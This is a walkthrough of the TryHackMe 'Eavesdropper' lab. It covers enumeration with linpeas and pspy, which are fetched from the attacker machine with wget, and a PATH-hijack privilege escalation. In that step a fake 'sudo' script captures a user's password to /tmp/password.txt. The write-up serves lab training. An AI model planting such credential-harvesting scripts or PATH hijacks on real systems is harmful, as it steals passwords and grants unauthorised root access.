
---
title: "Eavesdropper"
date: 2023-03-04
layout: "writeup"
difficulty: "Medium"
excerpt: "Walkthrough for Eavesdropper on Try Hack Me"
os: "Linux"
platform: "TryHackMe"
tags: [Try Hack Me, Eavesdropper]
comments: false
---

[Eavesdropper](https://tryhackme.com/room/eavesdropper) is a Medium difficulty room available on [TryHackMe](https://tryhackme.com). The main challenge focuses on your enumeration skills to find something you can listen to to uncover the root user's password.

### Task 1 - Download Keys

For this task, make sure you Download the provided task files and save the SSH private key to a directory on your attacker box. Complete this task once this has been done.

![Eavesdropper download SSH key](/images/Eavesdropper-1.png)


### Task 2 - Find the Flag

This task wants you to connect with the provided SSH keys and put your enumeration skills to the test to find a way to escalate privileges.

![Eavesdropper Task 2](/images/Eavesdropper-2.png)

First, we need to change the permissions on the provided SSH key with:

`chmod 600 idrsa.id-rsa`

![Eavesdropper chmod ssh key](/images/Eavesdropper-3.png)

Next, let's connect to the target machine as frank with:

`ssh frank@<target ip> -i idrsa.id-rsa`

![Eavesdropper ssh Frank](/images/Eavesdropper-4.png)

Next, let's copy linpeas over to the target machine. On your attacker machine, start an http server with python with:

`python3 -m http.server`

![Eavesdropper python http server](/images/Eavesdropper-5.png)

Next, on your target machine, navigate to the /tmp directory and run:

`wget http://<attack machine ip>:8000/linpeas.sh`

![Eavesdropper download linpeas](/images/Eavesdropper-6.png)

Next, make it executable with:

`chmod +x linpeas.sh`

and then run it with:

`./linpeas.sh`

This did not return anything too useful. Let's follow this same process to move pspy64 over to the victim machine:

![Eavesdropper download pspy](/images/Eavesdropper-7.png)

This returns some interesting inforamtion. It appears that there's an automated process that is logging in as frank via ssh, and then using cat to list the data in the /etc/shadow file:

![Eavesdropper pspy processes](/images/Eavesdropper-8.png)

What is interesting about this is that it is running sudo without a full path, and it is currently located in /usr/bin, which is not the first entry in the $PATH variable.

![Eavesdropper cat PATH](/images/Eavesdropper-9.png)

Let's modify this to add /tmp to the beginning by modifying the .bashrc file in frank's home directory.

![Eavesdropper modify .bashrc](/images/Eavesdropper-10.png)

Next, we need to make an executable "sudo" file in the /tmp directory that can be used to capture credentials.

The code I used to capture the password is as follows:

```
#!/bin/bash
read -sp "Give me your password please: " password
echo $password > /tmp/password.txt
echo "\n"
```

![Eavesdropper malicious sudo](/images/Eavesdropper-11.png)

Next, in a second terminal window, I created another SSH session and logged in as frank:

![Eavesdropper frank 2nd SSH session](/images/Eavesdropper-12.png)

As you can see in the screenshot above, /tmp is the first listing in the $PATH variable. Let's see if there's any information in the /tmp/password.txt file as we would expect with:

`cat /tmp/password.txt`

![Eavesdropper frank password](/images/Eavesdropper-13.png)

We now have frank's password. Copy the value in the password.txt file and go back to your first ssh session and run:

`sudo su`

This will not work in the 2nd session since we hijacked the path, as it will try to run our malicious "sudo" file again. You could also specify the /usr/bin/sudo from the 2nd session to run the "real" sudo executable.

![Eavesdropper root access](/images/Eavesdropper-14.png)

Next, navigate to the root user's home directory and print out the contents of the flag.txt file with:

`cat flag.txt`

![Eavesdropper root flag](/images/Eavesdropper-15.png)

